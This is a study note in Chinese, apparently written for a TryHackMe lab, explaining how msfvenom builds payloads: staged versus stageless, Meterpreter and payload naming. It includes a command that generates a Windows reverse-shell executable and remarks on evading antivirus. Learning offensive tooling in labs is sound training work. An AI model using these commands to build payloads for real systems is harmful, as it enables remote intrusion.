> [!info] LINK & TAG
> [TryHackMe | What the Shell?](https://tryhackme.com/room/introtoshells)
> 
> #tag
# Msfvenom Payload 生成技術筆記

## 1. 簡介與基本語法

`msfvenom` 結合了載荷生成與編碼功能，可以產出多種格式（如 `.exe`, `.py`, `.aspx`, `.war`）或十六進位制（Shellcode）。

**基本語法結構：**


```bash
msfvenom -p <PAYLOAD> <OPTIONS>
```

**範例：生成 Windows x64 Stageless 反彈 Shell 執行檔**


```bash
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=<Your_IP> LPORT=<Your_Port>
```

### **常用參數說明：**

- **`-p` (Payload)**：指定要使用的攻擊載荷。
    
- **`-f` (Format)**：指定輸出格式（如 `exe`, `elf`, `raw`, `python`）。
    
- **`-o` (Output)**：指定輸出的路徑與檔名。
    
- **`LHOST`**：攻擊者的監聽 IP（連回地址）。
    
- **`LPORT`**：攻擊者的監聽連接埠。
    

---

## 2. 分段式 (Staged) vs 不分段式 (Stageless)

這是 Msfvenom 中最重要的概念之一，影響載荷的傳輸與隱蔽性。

| **類型**              | **命名格式**                                       | **工作原理**                                                         | **優缺點**                                                                                    |
| ------------------- | ---------------------------------------------- | ---------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| **Staged (分段式)**    | 使用 `/` 分隔<br><br>  <br><br>`shell/reverse_tcp` | 分兩階段：1. 執行微型 **Stager**。2. Stager 連回攻擊機下載真正的 **Stage** 載荷到記憶體執行。 | **優點**：體積小、不落地（減少被防毒軟體攔截機率）。<br><br>  <br><br>**缺點**：必須使用 Metasploit 的 `multi/handler` 接收。 |
| **Stageless (不分段)** | 使用 `_` 分隔<br><br>  <br><br>`shell_reverse_tcp` | 所有的功能程式碼都包含在一個單一檔案中。執行後直接建立 Shell。                               | **優點**：簡單、可用 `nc` 接收。<br><br>  <br><br>**缺點**：檔案較大、特徵明顯，容易被傳統殺毒軟體抓到。                       |

---

## 3. Meterpreter Shell

**Meterpreter** 是 Metasploit 專屬的一種全功能 Shell：

- **高度穩定**：特別是在 Windows 環境下。
    
- **強大功能**：內建檔案上傳/下載、權限提升、鍵盤記錄、螢幕截圖等後滲透工具。
    
- **限制**：只能使用 Metasploit 的 `multi/handler` 來監聽與操作。
    

---

## 4. 命名規範 (Naming Convention)

理解命名規律可以讓你快速找到所需的 Payload：

> **格式：`<作業系統>/<架構>/<載荷類型>`**

- **架構 (arch)**：
    
    - 64 位元：明確標註 `x64`。
        
    - 32 位元 (Windows)：**不標註**（例外情況）。
        
    - 32 位元 (Linux)：標註 `x86`。
        
- **載荷範例：**
    
    - `windows/x64/meterpreter/reverse_tcp` (Windows 64位元, Staged)
        
    - `windows/meterpreter_reverse_tcp` (Windows 32位元, Stageless)
        
    - `linux/x86/shell_reverse_tcp` (Linux 32位元, Stageless)
        

---

## 5. 實用查詢指令

Msfvenom 包含數以千計的載荷，使用 `grep` 進行過濾是最快的方法。

- **列出所有載荷：**
    
    
    ```bash
    msfvenom --list payloads
    ```
    
- **搜索特定作業系統與類型的載荷：**
    
    
    ```bash
    msfvenom --list payloads | grep "linux/x86/meterpreter"
    ```
    
